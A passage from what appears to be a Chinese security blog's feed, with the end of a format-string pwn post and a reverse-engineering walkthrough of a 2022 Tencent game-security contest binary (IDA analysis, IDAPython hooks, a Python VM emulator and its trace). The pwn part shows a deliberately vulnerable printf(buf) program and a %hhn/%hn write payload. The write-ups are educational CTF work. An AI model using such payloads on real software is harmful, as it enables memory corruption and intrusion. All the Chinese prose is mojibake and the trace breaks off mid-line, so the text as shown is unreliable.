class="number">1</span>)&#123;</span><br><span class="line">        <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">0x100</span>);</span><br><span class="line">        read(<span class="number">0</span>, buf, <span class="number">0x100</span>);</span><br><span class="line">        <span class="built_in">printf</span>(buf);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;var1: %lx\nvar2: %lx\n&quot;</span>, var1, var2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å‘é€ä»¥ä¸‹æ ¼å¼åŒ–å­—ç¬¦ä¸²è¿›è¡Œæµ‹è¯•: <code>&quot;%88c%40$hhn%256c%38$hn&quot;</code> å…¶ä¸­%40$pä¸ºptr2 %38$pä¸ºptr1</p>
<p>æœŸæœ›çš„è¡Œä¸ºæ˜¯è¿›è¡Œæ ¼å¼åŒ–è¾“å‡ºåå…ˆæ˜¯é€šè¿‡ptr2ä¿®æ”¹äº†ptr1 ä½¿å…¶æŒ‡å‘var2 ç„¶åé€šè¿‡ptr1å‘var2ä¸­å†™å…¥æ•°æ®</p>
<p>ä½†å®é™…çš„ç»“æœæ˜¯ptr1ç¡®å®è¢«ä¿®æ”¹ä¸ºæŒ‡å‘var2çš„æŒ‡é’ˆ ä½†è¢«å†™å…¥æ•°æ®çš„ä¾ç„¶æ˜¯var1:</p>
<p>æ‰§è¡Œå‰:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2025%2F03%2F09%2F20250309-220942.png" alt="image-20250309220942349"></p>
<p>æ‰§è¡Œå:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2025%2F03%2F09%2F20250309-221210.png" alt="image-20250309221210187"></p>
<p>å¯ä»¥çœ‹åˆ°åœ¨è¿›è¡Œå¯¹ptr1çš„ä¿®æ”¹å‰å°±å·²ç»ç¼“å­˜äº†ptr1åœ¨æ‰§è¡Œå‰çš„å€¼å¹¶åœ¨åç»­ä¾ç„¶å‘é‚£ä¸ªä¿å­˜å€¼ä¸­å†™å…¥æ•°æ®</p>
<p>è€Œè¿™ä¸ªç‰¹æ€§æœ€é«˜åœ¨glibc 2.23ä»å¯ä»¥è¢«å¤ç°</p>
]]></content>
      <categories>
        <category>äºŒè¿›åˆ¶</category>
        <category>Pwn</category>
      </categories>
      <tags>
        <tag>Pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>è·Ÿç€2022å¹´è…¾è®¯æ¸¸æˆå®‰å…¨ç«èµ›(åˆèµ›)ä»é›¶å¼€å§‹å­¦DLLæ³¨å…¥</title>
    <url>/2025/03/26/%E8%B7%9F%E7%9D%802022%E5%B9%B4%E8%85%BE%E8%AE%AF%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-%E5%88%9D%E8%B5%9B-%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%AD%A6DLL%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<p>è®°å½•ä¸€ä¸‹å¤ç°2022å¹´è…¾è®¯æ¸¸æˆå®‰å…¨åˆèµ›çš„è¸©å‘ç»å†</p>
<span id="more"></span>

<p>è¿™ä¸€å¹´çš„åˆèµ›èµ›é¢˜æ„Ÿè§‰æ˜¯å†å¹´æ¥æ¯”è¾ƒä¸çŒœè¿·ä¸”ç®€å•çš„ é™„ä»¶æ²¡å¥—å£³æ²¡æ··æ·†æ²¡åè°ƒè¯• å…ˆå°è¯•è¿è¡Œä¸€ä¸‹ å¼€äº†ä¸€ä¸ªçª—å£æ¸²æŸ“å‡ºäº†<code>ACE</code>å­—æ ·:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2025%2F03%2F25%2F20250325-214739.png" alt="image-20250325214732558"></p>
<p>ä½†æ˜¯è¿‡äº†å‡ ç§’å°±ç©ºç™½äº† è€Œè§£å‡ºè¿™é¢˜è¦æ±‚è®©ç¨‹åºè‡ªå·±ç”»å‡ºå¦‚ä¸‹ä¾‹å›¾:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2025%2F03%2F25%2F20250325-215634.png" alt="image-20250325215634213"></p>
<h2 id="IDAé™æ€åˆ†æ"><a href="#IDAé™æ€åˆ†æ" class="headerlink" title="IDAé™æ€åˆ†æ"></a>IDAé™æ€åˆ†æ</h2><p>æ¥ä¸‹æ¥å…ˆç”¨IDAé™æ€åˆ†æä¸€ä¸‹é€»è¾‘</p>
<p><code>WinMain</code>ä¸­çš„ä¸»è¦é€»è¾‘åœ¨æ¶ˆæ¯å¾ªç¯å¤„:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2025%2F03%2F25%2F20250325-215443.png" alt="image-20250325215443774"></p>
<p>å½“æ¶ˆæ¯é˜Ÿåˆ—é‡Œæ²¡æœ‰è¦å¤„ç†çš„æ¶ˆæ¯æ—¶ä¼šè°ƒç”¨<code>func1</code> å°è¯•NOPæ‰å‘ç°å°±ä¸æ‰“å°å›¾åƒäº† é‚£ä¹ˆæ¸²æŸ“å‡ºå›¾åƒçš„é€»è¾‘åº”è¯¥å°±åœ¨å…¶ä¸­</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2025%2F03%2F25%2F20250325-220410.png" alt="image-20250325220410521"></p>
<p>ä¸€å¼€å§‹å°±ç”¨<code>ZwAllocateVirtualMemory</code>åˆ†é…äº†ä¸€å—RWXçš„å†…å­˜<code>Target_Mem</code></p>
<p>å…³äºè¯¥å†…æ ¸å‡½æ•°:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">NTSYSAPI NTSTATUS <span class="title function_">ZwAllocateVirtualMemory</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in]      HANDLE    ProcessHandle,</span></span><br><span class="line"><span class="params">  [in, out] PVOID     *BaseAddress,</span></span><br><span class="line"><span class="params">  [in]      ULONG_PTR ZeroBits,</span></span><br><span class="line"><span class="params">  [in, out] PSIZE_T   RegionSize,</span></span><br><span class="line"><span class="params">  [in]      ULONG     AllocationType,</span></span><br><span class="line"><span class="params">  [in]      ULONG     Protect</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>

<p>ä»è¿™é‡Œå¤§æ¦‚å°±èƒ½çŒœåˆ°ä¸‹é¢è¦åŠ è½½shellcodeæ¥è¿è¡Œäº†:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2025%2F03%2F25%2F20250325-220838.png" alt="image-20250325220838124"></p>
<p>æœç„¶æ¥ä¸‹æ¥å°±è§£ç äº†ä¸€æ®µshellcode ç„¶åä»¥å…¶ä¸­çš„<code>dec_func</code>ä¸ºå…¥å£æ‰§è¡Œ è¿˜èƒ½çœ‹åˆ°ä¼šæ ¹æ®ç¨‹åºè¿è¡Œçš„æ—¶é—´é”€æ¯è¿™ä¸ªæ®µ è¿™åº”è¯¥å°±æ˜¯å›¾åƒå‡ ç§’é’Ÿå°±æ¶ˆå¤±çš„åŸå›  patchæ‰è¿™ä¸ªåˆ†æ”¯ä»¥ä¾¿åç»­è°ƒè¯•å’Œhook</p>
<p>æ—¢ç„¶ç¨‹åºæ²¡æœ‰ä»»ä½•åè°ƒè¯• ç›´æ¥è°ƒè¯•çœ‹çœ‹é‡Œé¢å¹²äº†ä»€ä¹ˆ</p>
<h2 id="åˆæ­¥åŠ¨æ€åˆ†æ"><a href="#åˆæ­¥åŠ¨æ€åˆ†æ" class="headerlink" title="åˆæ­¥åŠ¨æ€åˆ†æ"></a>åˆæ­¥åŠ¨æ€åˆ†æ</h2><p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2025%2F03%2F25%2F20250325-221346.png" alt="image-20250325221346485"></p>
<p>ä¸€è¿›æ¥å°±çœ‹åˆ°äº†å¾ˆæ‰çœ¼çš„ä¸€ä¸²<code>HLSL</code> å®ƒæ˜¯ç”¨äºè¢«<code>D3DCompile</code>ç¼–è¯‘ä¸ºç€è‰²å™¨çš„é«˜çº§è¯­è¨€ é‚£ä¹ˆä¸‹é¢ä»¥å®ƒä¸ºå‚æ•°æ‰§è¡Œçš„åº”è¯¥å°±æ˜¯<code>D3DCompile </code> åŒæ ·ä¸‹é¢è¿˜æœ‰ä¸€æ®µ é—®AI è¯´ä¸€ä¸ªæ˜¯å®šç‚¹ç€è‰²å™¨ä¸€ä¸ªæ˜¯åƒç´ ç€è‰²å™¨ ä¸è¿‡è¿™äº›éƒ½ä¸é‡è¦ æœ€é‡è¦çš„æ˜¯è¦çŸ¥é“å…‰æ˜¯ç¼–è¯‘ç€è‰²å™¨æ˜¯æ— æ³•å®Œæˆå›¾åƒçš„æ¸²æŸ“çš„ å…·ä½“çš„åæ ‡å’Œé¢œè‰²å‚æ•°è‚¯å®šä¼šåœ¨æŸå¤„ä¼ å…¥</p>
<p>åç»­ç¨‹åºæ‰§è¡Œçš„åŸºæœ¬ä¸Šéƒ½æ˜¯åº“å‡½æ•° åŸºæœ¬ä¸Šä¸å¤ªå¯èƒ½åœ¨é‡Œé¢ç”Ÿæˆä½ç½®å’Œé¢œè‰²å‚æ•° ç›´åˆ°åˆè¿›å…¥äº†ä¸€ä¸ªå”¯ä¸€è¢«è°ƒç”¨çš„ç”¨æˆ·å‡½æ•°:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2025%2F03%2F25%2F20250325-221910.png" alt="image-20250325221910107"></p>
<p>é‡Œé¢æ˜¯ä¸€ä¸ªçœ‹èµ·æ¥å¾ˆç®€å•çš„è™šæ‹Ÿæœºè¿‡ç¨‹:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2025%2F03%2F25%2F20250325-222241.png" alt="image-20250325222241850"></p>
<p>å…¶ä¸­<code>reg</code>å’Œ<code>draw_cube</code>æ˜¯æ ¹æ®é€»è¾‘è‡ªå·±å®šä¹‰çš„ IDAè‡ªå·±è¯†åˆ«ä¼šè¯†åˆ«å‡ºå‡ ä¸ªå˜é‡</p>
<p>å½“opcodeä¸º5æˆ–6æ—¶è¿˜ä¼šæ‰§è¡Œä¸€ä¸ªç”¨æˆ·å‡½æ•°<code>draw_cube</code> å®ƒçš„ç¬¬5ä¸ªå‚æ•°åˆ†åˆ«æ˜¯è“è‰²å’Œé»„è‰²çš„argbå€¼ çŒœæµ‹è¿™é‡Œåº”è¯¥å°±æ˜¯ç»˜åˆ¶å›¾åƒçš„å‡½æ•° é‡Œé¢è¿›è¡Œäº†å¾ˆå¤šæµ®ç‚¹æ•°è¿ç®— çœ‹ä¸æ‡‚ä»€ä¹ˆæ„æ€ ä½†æ˜¯æ ¹æ®åœ¨ç»˜åˆ¶è“è‰²æ–¹å—çš„è°ƒç”¨å¤„ä¸‹æ–­è¿›è¡Œè°ƒè¯•å¤§æ¦‚å¯ä»¥çœ‹å‡ºæ¥ç¬¬1, 2ä¸ªå‚æ•°åˆ†åˆ«æ˜¯x, yåæ ‡ å› ä¸ºå€¼éƒ½ä¸æ˜¯å¾ˆå¤§ ç¼–å†™IDApythonè„šæœ¬åˆæ­¥hookè¿™ä¸¤ä¸ªè°ƒç”¨çœ‹çœ‹å‰4ä¸ªå‚æ•°åœ¨æ¯æ¬¡è°ƒç”¨æ—¶æ˜¯ä»€ä¹ˆ:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> ida_dbg <span class="keyword">import</span> get_reg_val <span class="keyword">as</span> regs</span><br><span class="line"><span class="keyword">from</span> idc <span class="keyword">import</span> get_bytes</span><br><span class="line"></span><br><span class="line">a1 = regs(<span class="string">&#x27;ecx&#x27;</span>)</span><br><span class="line">a2 = regs(<span class="string">&#x27;edx&#x27;</span>)</span><br><span class="line">a3 = regs(<span class="string">&#x27;r8d&#x27;</span>)</span><br><span class="line">a4 = regs(<span class="string">&#x27;r9d&#x27;</span>)</span><br><span class="line">a5 = <span class="built_in">int</span>.from_bytes(get_bytes(regs(<span class="string">&#x27;rsp&#x27;</span>) + <span class="number">0x80</span> - <span class="number">0x60</span>, <span class="number">4</span>), <span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;log.txt&#x27;</span>, <span class="string">&#x27;a+&#x27;</span>) <span class="keyword">as</span> log:</span><br><span class="line">    log.write(<span class="string">f&#x27;args : [<span class="subst">&#123;<span class="built_in">hex</span>(a1)&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(a2)&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(a3)&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(a4)&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(a5)&#125;</span>, ...]\n&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°ä»¥ä¸‹ç»“æœ:</p>
<figure class="highlight latex"><table><tr><td class="code"><pre><span class="line">args : [0xfffffc4a, 0x32, 0xff1fa3ac, 0x130bd0, 0xffffff00, ...]</span><br><span class="line">args : [0x32, 0xfffffe7a, 0x1bcd69, 0xffe8bcc5, 0xffffff00, ...]</span><br><span class="line">args : [0xfffffc4a, 0xaa, 0xff8eb263, 0xd91997, 0xffffff00, ...]</span><br><span class="line">args : [0x32, 0xe6, 0x1cf400, 0xe82b18, 0xffffff00, ...]</span><br><span class="line">args : [0xfffffc4a, 0xffffff2e, 0x391faa, 0x6ee5d2, 0xffffff00, ...]</span><br><span class="line">args : [0x32, 0x15e, 0xebe72, 0xd77de2, 0xffffff00, ...]</span><br><span class="line">args : [0xfffffc86, 0xfffffef2, 0x71150, 0x74fb28, 0xffffff00, ...]</span><br><span class="line">args : [0xaa, 0xfffffef2, 0xffda3e17, 0xc42e8b, 0xffffff00, ...]</span><br><span class="line">args : [0xfffffcfe, 0xe6, 0x34cf2b, 0xff321ecf, 0xffffff00, ...]</span><br><span class="line">args : [0x6e, 0xfffffe7a, 0xffa49c19, 0xd9e5f1, 0xffffff00, ...]</span><br><span class="line">args : [0xfffffcc2, 0xaa, 0xffca5ee7, 0xc42d8b, 0xffffff00, ...]</span><br><span class="line">args : [0x28a, 0x32, 0xeabf17, 0xa7e3ab, 0xff2ddbe7, ...]</span><br><span class="line">args : [0x24e, 0x6e, 0xc42d8b, 0xcb0f37, 0xff2ddbe7, ...]</span><br><span class="line">args : [0x212, 0xaa, 0xd717af, 0x1f5b13, 0xff2ddbe7, ...]</span><br><span class="line">args : [0x1d6, 0xe6, 0xc460e9, 0xe9ad55, 0xff2ddbe7, ...]</span><br><span class="line">args : [0x19a, 0x122, 0xc7a989, 0xb9fd35, 0xff2ddbe7, ...]</span><br><span class="line">args : [0x1d6, 0x122, 0xab7100, 0x646cf8, 0xff2ddbe7, ...]</span><br><span class="line">args : [0x212, 0x122, 0xc409a9, 0x31cd9d, 0xff2ddbe7, ...]</span><br><span class="line">args : [0x2c6, 0x32, 0xd77e8b, 0x2f2773, 0xff2ddbe7, ...]</span><br><span class="line">args : [0x302, 0x32, 0xd9ad01, 0x996535, 0xff2ddbe7, ...]</span><br><span class="line">args : [0x33e, 0x32, 0x39e156, 0xda4a26, 0xff2ddbe7, ...]</span><br><span class="line">args : [0x2c6, 0x6e, 0x13207c, 0x346848, 0xff2ddbe7, ...]</span><br><span class="line">args : [0x302, 0xaa, 0xc9140b, 0xb5fa7, 0xff2ddbe7, ...]</span><br><span class="line">args : [0x33e, 0xe6, 0x53071f, 0xc7ab3b, 0xff2ddbe7, ...]</span><br><span class="line">args : [0x37a, 0x122, 0xd71106, 0xd6329a, 0xff2ddbe7, ...]</span><br><span class="line">args : [0x3b6, 0x122, 0xeb60a1, 0xa58d79, 0xff2ddbe7, ...]</span><br><span class="line">args : [0x3f2, 0x122, 0xeb67cd, 0xf5e9d9, 0xff2ddbe7, ...]</span><br><span class="line">args : [0x42e, 0x122, 0xd71161, 0xd7d31, 0xff2ddbe7, ...]</span><br><span class="line">args : [0x3b6, 0x32, 0x677611, 0x659df9, 0xff2ddbe7, ...]</span><br><span class="line">args : [0x3f2, 0x32, 0x40173d, 0x557919, 0xff2ddbe7, ...]</span><br><span class="line">args : [0x42e, 0x32, 0xd77661, 0x3d9d01, 0xff2ddbe7, ...]</span><br><span class="line">args : [0x46a, 0x32, 0xefff9a, 0xca2e06, 0xff2ddbe7, ...]</span><br><span class="line">args : [0x3f2, 0x6e, 0xc404eb, 0xb7178b, 0xff2ddbe7, ...]</span><br><span class="line">args : [0x42e, 0xaa, 0xd7c6ef, 0x8b6337, 0xff2ddbe7, ...]</span><br><span class="line">args : [0x46a, 0xaa, 0xd7701f, 0x677b0b, 0xff2ddbe7, ...]</span><br><span class="line">args : [0x4a6, 0xaa, 0xd71171, 0xfd4d21, 0xff2ddbe7, ...]</span><br><span class="line">args : [0x4e2, 0xaa, 0x3906ab, 0xbbf27, 0xff2ddbe7, ...]</span><br><span class="line">args : [0x46a, 0xe6, 0x96663, 0xef5f33, 0xff2ddbe7, ...]</span><br><span class="line">args : [0x4a6, 0x122, 0x732157, 0x835b9f, 0xff2ddbe7, ...]</span><br><span class="line">args : [0x4e2, 0x122, 0x353730, 0x383434, 0xff2ddbe7, ...]</span><br><span class="line">args : [0x51e, 0x122, 0x6257a9, 0x9555e9, 0xff2ddbe7, ...]</span><br><span class="line">args : [0x55a, 0x122, 0xd777af, 0xdf5bd3, 0xff2ddbe7, ...]</span><br></pre></td></tr></table></figure>

<p>é»„è‰²çš„è°ƒç”¨äº†11æ¬¡ è“è‰²çš„è°ƒç”¨äº†31æ¬¡ å¯ä»¥å’Œæ˜¾ç¤ºå‡ºæ¥çš„å›¾åƒå¯¹ä¸Š å¹¶ä¸”è§‚å¯Ÿç»˜åˆ¶è“è‰²æ–¹å—æ—¶çš„ç¬¬2ä¸ªå‚æ•° è¿™ä¸ªå‚æ•°ä¸º0x32çš„æœ‰8æ¬¡è°ƒç”¨ å¯¹åº”äº†yåæ ‡æœ€å°æ—¶çš„è“è‰²æ–¹å—ä¸€å…±æœ‰8ä¸ª ä¹Ÿå°±æ˜¯è¯´å‰ä¸¤ä¸ªå‚æ•°ç¡®å®å¯¹åº”x, yåæ ‡</p>
<p>ç»˜åˆ¶é»„è‰²æ–¹å—çš„å‡½æ•°ä¹Ÿæ˜¯æœ‰è°ƒç”¨çš„ åº”è¯¥ä¹Ÿä¼šç»˜åˆ¶å‡ºé»„è‰²æ–¹å— ä½†æ˜¯å½“ç»˜åˆ¶é»„è‰²æ–¹å—æ—¶ä¼ å…¥çš„ä½ç½®å‚æ•°æœ‰å¾ˆå¤šæ˜¯è´Ÿæ•°çš„ å³ä½¿æ˜¯ä¸¤ä¸ªçœ‹èµ·æ¥éƒ½å¾ˆæ­£å¸¸çš„åæ ‡ ä¹Ÿæ²¡ç”¨ä»»ä½•é»„è‰²æ–¹å—è¢«ç»˜åˆ¶ é‚£ä¹ˆå°±è¦åˆ†æå®ƒçš„è™šæ‹Ÿæœºè¿‡ç¨‹äº† è¿˜å¥½è¿™ä¸€æ­¥ä¹Ÿä¸ç®—å¤æ‚ æ¯•ç«Ÿåªæœ‰é‚£ä¹ˆå‡ ä¸ªopcode</p>
<h3 id="VMåˆ†æ"><a href="#VMåˆ†æ" class="headerlink" title="VMåˆ†æ"></a>VMåˆ†æ</h3><p>dumpå‡ºopcodeåç”¨pythonè„šæœ¬æ¨¡æ‹Ÿ:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">opcode = [</span><br><span class="line">    <span class="number">0x00000002</span>, <span class="number">0x00000008</span>, <span class="number">0x00000000</span>, <span class="number">0x00000002</span>, <span class="number">0x00000000</span>, <span class="number">0x00000004</span>, <span class="number">0x00000002</span>, <span class="number">0x00000004</span>, <span class="number">0x00000000</span>, <span class="number">0x00000003</span>, ...</span><br><span class="line">]</span><br><span class="line">mask = ((<span class="number">1</span> &lt;&lt; <span class="number">32</span>) - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;result_fix.txt&#x27;</span>, <span class="string">&#x27;a+&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    ip = <span class="number">0</span></span><br><span class="line">    reg = [<span class="number">0</span>] * <span class="number">10</span></span><br><span class="line">    reg[-<span class="number">1</span>] = reg[-<span class="number">2</span>] = <span class="number">50</span></span><br><span class="line">    <span class="keyword">while</span> ip &lt; <span class="built_in">len</span>(opcode):</span><br><span class="line">        res = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">match</span> opcode[ip]:</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">                res = <span class="string">f&quot;reg[0](<span class="subst">&#123;reg[<span class="number">0</span>] :#08x&#125;</span>) += reg[1](<span class="subst">&#123;reg[<span class="number">1</span>] :#08x&#125;</span>) -&gt; <span class="subst">&#123;reg[<span class="number">0</span>] + reg[<span class="number">1</span>] :#08x&#125;</span>&quot;</span></span><br><span class="line">                reg[<span class="number">0</span>] += reg[<span class="number">1</span>]</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                res = <span class="string">f&quot;reg[0](<span class="subst">&#123;reg[<span class="number">0</span>] :#08x&#125;</span>) -= reg[1](<span class="subst">&#123;reg[<span class="number">1</span>] :#08x&#125;</span>) -&gt; <span class="subst">&#123;reg[<span class="number">0</span>] - reg[<span class="number">1</span>] :#08x&#125;</span>&quot;</span></span><br><span class="line">                reg[<span class="number">0</span>] -= reg[<span class="number">1</span>]</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                opr = opcode[ip + <span class="number">1</span>]</span><br><span class="line">                ip += <span class="number">2</span></span><br><span class="line">                res = <span class="string">f&quot;reg[<span class="subst">&#123;opcode[ip]&#125;</span>] = reg[<span class="subst">&#123;opr&#125;</span>] -&gt; <span class="subst">&#123;reg[opr] :#08x&#125;</span>&quot;</span></span><br><span class="line">                reg[opcode[ip]] = reg[opr]</span><br><span class="line">            <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                opr = opcode[ip + <span class="number">1</span>]</span><br><span class="line">                ip += <span class="number">2</span></span><br><span class="line">                res = <span class="string">f&quot;reg[<span class="subst">&#123;opcode[ip]&#125;</span>] = <span class="subst">&#123;opr&#125;</span> -&gt; <span class="subst">&#123;opr :#08x&#125;</span>&quot;</span></span><br><span class="line">                reg[opcode[ip]] = opr</span><br><span class="line">            <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">                ip += <span class="number">1</span></span><br><span class="line">                res = <span class="string">f&quot;Decode reg[0] and reg[1] -&gt;&quot;</span></span><br><span class="line">                v1 = reg[<span class="number">0</span>]</span><br><span class="line">                v2 = (reg[<span class="number">0</span>] * (reg[<span class="number">1</span>] + <span class="number">1</span>)) &amp; mask</span><br><span class="line">                reg[<span class="number">0</span>] = opcode[ip] ^ <span class="number">0x414345</span></span><br><span class="line">                reg[<span class="number">1</span>] = ((reg[<span class="number">0</span>] ^ (reg[<span class="number">1</span>] + v1)) % <span class="number">256</span> + (((reg[<span class="number">0</span>] ^ (v1 * reg[<span class="number">1</span>])) % <span class="number">256</span> + (((reg[<span class="number">0</span>] ^ (reg[<span class="number">1</span>] + v2)) % <span class="number">256</span>) &lt;&lt; <span class="number">8</span>)) &lt;&lt; <span class="number">8</span>)) &amp; mask</span><br><span class="line">                res += <span class="string">f&quot; <span class="subst">&#123;reg[<span class="number">0</span>] :#08x&#125;</span>, <span class="subst">&#123;reg[<span class="number">1</span>] :#08x&#125;</span>&quot;</span></span><br><span class="line">            <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">                res = <span class="string">f&quot;Draw yellow cube with args: <span class="subst">&#123;reg[<span class="number">4</span>]:#08x&#125;</span>, <span class="subst">&#123;reg[<span class="number">5</span>]:#08x&#125;</span>, <span class="subst">&#123;reg[<span class="number">6</span>]:#08x&#125;</span>, <span class="subst">&#123;reg[<span class="number">7</span>]:#08x&#125;</span>&quot;</span></span><br><span class="line">                yellow_points.append((reg[<span class="number">4</span>], reg[<span class="number">5</span>]))</span><br><span class="line">                arg3.append(reg[<span class="number">6</span>])</span><br><span class="line">                arg4.append(reg[<span class="number">7</span>])</span><br><span class="line">            <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">                res = <span class="string">f&quot;Draw blue   cube with args: <span class="subst">&#123;reg[<span class="number">4</span>]:#08x&#125;</span>, <span class="subst">&#123;reg[<span class="number">5</span>]:#08x&#125;</span>, <span class="subst">&#123;reg[<span class="number">6</span>]:#08x&#125;</span>, <span class="subst">&#123;reg[<span class="number">7</span>]:#08x&#125;</span>&quot;</span></span><br><span class="line">                Blue_points.append((reg[<span class="number">4</span>], reg[<span class="number">5</span>]))</span><br><span class="line">            <span class="keyword">case</span> _:</span><br><span class="line">                ip += <span class="number">1</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            </span><br><span class="line">        ip += <span class="number">1</span></span><br><span class="line">        f.write(<span class="string">f&quot;<span class="subst">&#123;res&#125;</span>\n&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°ä»¥ä¸‹ç»“æœ:</p>
<figure class="highlight latex"><table><tr><td class="code"><pre><span class="line">reg[0] = reg[8] -&gt; 0x000032</span><br><span class="line">reg[4] = reg[0] -&gt; 0x000032</span><br><span class="line">reg[0] = reg[4] -&gt; 0x000032</span><br><span class="line">reg[1] = 1000 -&gt; 0x0003e8</span><br><span class="line">reg[0](0x000032) -= reg[1](0x0003e8) -&gt; -0x003b6</span><br><span class="line">reg[4] = reg[0] -&gt; -0x003b6</span><br><span class="line">reg[0] = reg[9] -&gt; 0x000032</span><br><span class="line">reg[5] = reg[0] -&gt; 0x000032</span><br><span class="line">reg[0] = reg[4] -&gt; -0x003b6</span><br><span class="line">reg[1] = reg[5] -&gt; 0x000032</span><br><span class="line">Decode reg[0] and reg[1] -&gt; 0x130bd0, 0x20a4ac</span><br><span class="line">reg[3] = reg[0] -&gt; 0x130bd0</span><br><span class="line">reg[0] = reg[1] -&gt; 0x20a4ac</span><br><span class="line">reg[1] = reg[3] -&gt; 0x130bd0</span><br><span class="line">reg[6] = reg[0] -&gt; 0x20a4ac</span><br><span class="line">reg[7] = reg[1] -&gt; 0x130bd0</span><br><span class="line">Draw yellow cube with args: -0x003b6, 0x000032, 0x20a4ac, 0x130bd0</span><br><span class="line">reg[0] = reg[8] -&gt; 0x000032</span><br><span class="line">reg[4] = reg[0] -&gt; 0x000032</span><br><span class="line">reg[0] = reg[9] -&gt; 0x000032</span><br><span class="line">reg[1] = 60 -&gt; 0x00003c</span><br><span class="line">reg[0](0x000032) += reg[1](0x00003c) -&gt; 0x00006e</span><br><span class="line">reg[5] = reg[0] -&gt; 0x00006e</span><br><span class="line">reg[0] = reg[5] -&gt; 0x00006e</span><br><span class="line">reg[1] = 500 -&gt; 0x0001f4</span><br><span class="line">reg[0](0x00006e) -= reg[1](0x0001f4) -&gt; -0x00186</span><br><span class="line">reg[5] = reg[0] -&gt; -0x00186</span><br><span class="line">reg[0] = reg[4] -&gt; 0x000032</span><br><span class="line">reg[1] = reg[5] -&gt; -0x00186</span><br><span class="line">Decode reg[0] and reg[1] -&gt; 0x1bcd69, 0xe9bdc5</span><br><span class="line">reg[6] = reg[0] -&gt; 0x1bcd69</span><br><span class="line">reg[7] = reg[1] -&gt; 0xe9bdc5</span><br><span class="line">Draw yellow cube with args: 0x000032, -0x00186, 0x1bcd69, 0xe9bdc5</span><br><span class="line">reg[0] = reg[8] -&gt; 0x000032</span><br><span class="line">reg[4] = reg[0] -&gt; 0x000032</span><br><span class="line">reg[0] = reg[4] -&gt; 0x000032</span><br><span class="line">reg[1] = 1000 -&gt; 0x0003e8</span><br><span class="line">reg[0](0x000032) -= reg[1](0x0003e8) -&gt; -0x003b6</span><br><span class="line">reg[4] = reg[0] -&gt; -0x003b6</span><br><span class="line">reg[0] = reg[9] -&gt; 0x000032</span><br><span class="line">reg[1] = 120 -&gt; 0x000078</span><br><span class="line">reg[0](0x000032) += reg[1](0x000078) -&gt; 0x0000aa</span><br><span class="line">reg[5] = reg[0] -&gt; 0x0000aa</span><br><span class="line">reg[0] = reg[4] -&gt; -0x003b6</span><br><span class="line">reg[1] = reg[5] -&gt; 0x0000aa</span><br><span class="line">Decode reg[0] and reg[1] -&gt; 0xd91997, 0x8fb363</span><br><span class="line">reg[3] = reg[0] -&gt; 0xd91997</span><br><span class="line">reg[0] = reg[1] -&gt; 0x8fb363</span><br><span class="line">reg[1] = reg[3] -&gt; 0xd91997</span><br><span class="line">reg[6] = reg[0] -&gt; 0x8fb363</span><br><span class="line">reg[7] = reg[1] -&gt; 0xd91997</span><br><span class="line">Draw yellow cube with args: -0x003b6, 0x0000aa, 0x8fb363, 0xd91997</span><br><span class="line">reg[0] = reg[8] -&gt; 0x000032</span><br><span class="line">reg[4] = reg[0] -&gt; 0x000032</span><br><span class="line">reg[0] = reg[9] -&gt; 0x000032</span><br><span class="line">reg[1] = 180 -&gt; 0x0000b4</span><br><span class="line">reg[0](0x000032) += reg[1](0x0000b4) -&gt; 0x0000e6</span><br><span class="line">reg[5] = reg[0] -&gt; 0x0000e6</span><br><span class="line">reg[0] = reg[4] -&gt; 0x000032</span><br><span class="line">reg[1] = reg[5] -&gt; 0x0000e6</span><br><span class="line">Decode reg[0] and reg[1] -&gt; 0xe82b18, 0x1cf400</span><br><span class="line">reg[3] = reg[0] 